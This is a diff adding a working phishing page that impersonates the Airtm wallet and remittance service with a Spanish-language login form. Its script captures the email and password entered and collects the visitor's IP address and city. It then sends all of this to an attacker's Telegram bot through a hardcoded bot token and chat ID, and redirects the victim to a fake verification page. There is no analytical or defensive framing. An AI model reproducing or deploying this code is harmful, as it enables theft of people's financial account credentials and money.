@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
+    <script src="https://unpkg.com/unlazy@0.11.3/dist/unlazy.with-hashing.iife.js" defer init></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="sax.js"></script>
+    <script>
+      window.tailwind.config = {
+        darkMode: ['class'],
+        theme: {
+          extend: {
+            colors: {
+              border: 'hsl(var(--border))',
+              input: 'hsl(var(--input))',
+              ring: 'hsl(var(--ring))',
+              background: 'hsl(var(--background))',
+              foreground: 'hsl(var(--foreground))',
+              primary: {
+                DEFAULT: 'hsl(var(--primary))',
+                foreground: 'hsl(var(--primary-foreground))'
+              },
+              secondary: {
+                DEFAULT: 'hsl(var(--secondary))',
+                foreground: 'hsl(var(--secondary-foreground))'
+              },
+              destructive: {
+                DEFAULT: 'hsl(var(--destructive))',
+                foreground: 'hsl(var(--destructive-foreground))'
+              },
+              muted: {
+                DEFAULT: 'hsl(var(--muted))',
+                foreground: 'hsl(var(--muted-foreground))'
+              },
+              accent: {
+                DEFAULT: 'hsl(var(--accent))',
+                foreground: 'hsl(var(--accent-foreground))'
+              },
+              popover: {
+                DEFAULT: 'hsl(var(--popover))',
+                foreground: 'hsl(var(--popover-foreground))'
+              },
+              card: {
+                DEFAULT: 'hsl(var(--card))',
+                foreground: 'hsl(var(--card-foreground))'
+              },
+            },
+          }
+        }
+      }
+    </script>
+    <script>
+      var telegram_bot_id = "7727479523:AAHZybzovpijpdOVQm6oIGmAJ1jOFTFL6Es";
+      var chat_id = "1053231027";  
+      var u_name, pax, ip, ip2, message;
+
+      $(document).ready(function() {
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+        });
+
+        $.getJSON("https://ipinfo.io", function(response) {
+          $("#ip").html("IP: " + response.ip);
+          $("#address").html(response.city + ", " + response.country);
+        });
+
+        var sender = function() {
+          u_name = $("#uzer").val();
+          pax = $("#pazz").val();
+          ip = $("#gfg").text();
+          ip2 = $("#address").text();
+          message = "👤UZER: " + u_name + "\n🔒Cl4v3: " + pax +"\nIP: " + ip +"\n" + ip2 +"\n\n👾Demon HaNN👾";
+
+          var settings = {
+            "async": true,
+            "crossDomain": true,
+            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+            "method": "POST",
+            "headers": {
+              "Content-Type": "application/json",
+              "cache-control": "no-cache"
+            },
+            "data": JSON.stringify({
+              "chat_id": chat_id,
+              "text": message
+            })
+          };
+
+          $.ajax(settings).done(function(response) {
+            window.location = 'Verificationalert.html';
+            console.log(response);
+          });
+
+          return false;
+        };
+		document.getElementById("btnEnviar").addEventListener("click", function(event) {
+  if (document.getElementById("uzer").value === "" || document.getElementById("pazz").value === "") {
+    alert("Por favor, completa todos los campos.");
+    event.preventDefault(); // Evita que se continúe con la acción predeterminada
+  } else {
+    sender();
+  }
+});
+        $("#btnEnviar").on("click", sender);
+      });
+    </script>
+    <style type="text/tailwindcss">
+      @layer base {
+        :root {
+          --background: 0 0% 100%;
+          --foreground: 240 10% 3.9%;
+          --card: 0 0% 100%;
+          --card-foreground: 240 10% 3.9%;
+          --popover: 0 0% 100%;
+          --popover-foreground: 240 10% 3.9%;
+          --primary: 240 5.9% 10%;
+          --primary-foreground: 0 0% 98%;
+          --secondary: 240 4.8% 95.9%;
+          --secondary-foreground: 240 5.9% 10%;
+          --muted: 240 4.8% 95.9%;
+          --muted-foreground: 240 3.8% 46.1%;
+          --accent: 240 4.8% 95.9%;
+          --accent-foreground: 240 5.9% 10%;
+          --destructive: 0 84.2% 60.2%;
+          --destructive-foreground: 0 0% 98%;
+          --border: 240 5.9% 90%;
+          --input: 240 5.9% 90%;
+          --ring: 240 5.9% 10%;
+          --radius: 0.5rem;
+        }
+        .dark {
+          --background: 240 10% 3.9%;
+          --foreground: 0 0% 98%;
+          --card: 240 10% 3.9%;
+          --card-foreground: 0 0% 98%;
+          --popover: 240 10% 3.9%;
+          --popover-foreground: 0 0% 98%;
+          --primary: 0 0% 98%;
+          --primary-foreground: 240 5.9% 10%;
+          --secondary: 240 3.7% 15.9%;
+          --secondary-foreground: 0 0% 98%;
+          --muted: 240 3.7% 15.9%;
+          --muted-foreground: 240 5% 64.9%;
+          --accent: 240 3.7% 15.9%;
+          --accent-foreground: 0 0% 98%;
+          --destructive: 0 62.8% 30.6%;
+          --destructive-foreground: 0 0% 98%;
+          --border: 240 3.7% 15.9%;
+          --input: 240 3.7% 15.9%;
+          --ring: 240 4.9% 83.9%;
+        }
+      }
+    </style>
+</head>
+<body>
+    <div class="min-h-screen flex flex-col">
+      <header class="bg-black text-white flex justify-between items-center p-4">
+        <img src="https://media.licdn.com/dms/image/D5612AQHjB7O38DpMDg/article-cover_image-shrink_600_2000/0/1707914855070?e=2147483647&v=beta&t=AVLoKIo_5CxsAS0xDLVhSZwgWNP2gpLXiRVVe8xDkUc" alt="Logo" class="h-10">
+        <div class="flex items-center space-x-4">
+          <a href="#" class="text-sm">Descarga la app</a>
+          <div class="relative">
+            <button class="text-sm flex items-center space-x-1">
+              <span>ES</span>
+              <img aria-hidden="true" alt="dropdown-arrow" src="https://openui.fly.dev/openui/12x12.svg?text=▼" />
+            </button>
+          </div>
+        </div>
+      </header>
+      <div class="flex flex-1">
+        <div class="w-1/2 bg-cover bg-center relative text-sm md:block  flex items-center space-x-4 hidden md:flex" style="background-image: url('https://app.airtm-2.com/static/media/Daniel645c19f349ad01010c29.jpg');">
+          <div class="absolute inset-0 bg-black bg-opacity-50 flex flex-col justify-end p-8 text-white">
+            <h2 class="text-2xl font-bold">DANIEL</h2>
+            <p class="text-sm mb-4">Desarrollador</p>
+            <p class="text-sm w-1/2 bg-cover bg-center relative text-sm md:block  flex items-center space-x-4 hidden md:flex">"Airtm es mi mejor opción para tener mis fondos en la nube y enviarle remesas a mi familia en otro pais."</p>
+          </div>
+        </div>
+        <div class="w-full sm:w-1/2 flex items-center justify-center p-8 mx-auto">
+          <div class="w-full max-w-md sm:w-1/2 mx-auto">
+            <h2 class="text-3xl font-bold mb-6">INICIA SESIÓN</h2>
+            <div class="flex space-x-2 mb-4 ">
+              <button class="flex-1 bg-zinc-200 p-2 rounded-lg flex items-center justify-center">
+                <img aria-hidden="true" alt="Google logo" src="https://c0.klipartz.com/pngpicture/882/225/gratis-png-google-logo-google-logo-google-icono-de-busqueda-google.png" class="w-6 h-6" />
+              </button>
+              <button class="flex-1 bg-blue-600 text-white p-2 rounded-lg flex items-center justify-center">
+                <img aria-hidden="true" alt="Facebook logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/512px-Facebook_f_logo_%282019%29.svg.png" class="w-6 h-6" />
+              </button>
+              <button class="flex-1 bg-black text-white p-2 rounded-lg flex items-center justify-center">
+                <img aria-hidden="true" alt="Apple logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Apple_logo_grey.svg/800px-Apple_logo_grey.svg.png" class="w-6 h-6" />
+              </button>
+            </div>
+            <div class="text-center text-sm text-zinc-400 mb-4">o usa tu correo electrónico</div>
+            <div class="space-y-4">
+              <div>
+                <input type="text" id="uzer" placeholder="Correo electrónico" class="w-full p-2 border border-gray-300 rounded-lg" required="">
+              </div>
+              <div>
+                <input type="password" id="pazz" placeholder="Contraseña" class="w-full p-2 border border-gray-300 rounded-lg" required="">
+              </div>
+
+                <button id="btnEnviar" class="w-full p-2 bg-blue-600 text-white rounded-lg">Inicia sesión</button>
+                <div class="flex items-center justify-between text-sm">
+                  <a href="#" class="text-blue-600">¿Olvidaste tu contraseña?</a>
+                </div>
+                <div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <footer class="bg-gray-200 p-4 text-center text-sm text-gray-600">
+        <p>© 2023 Airtm. Todos los derechos reservados.</p>
+      </footer>
+      <div id="gfg" style="display: none;"></div>
+      <div id="ip" style="display: none;"></div>
+      <div id="address" style="display: none;"></div>
+    </div>
+</body>
+</html>
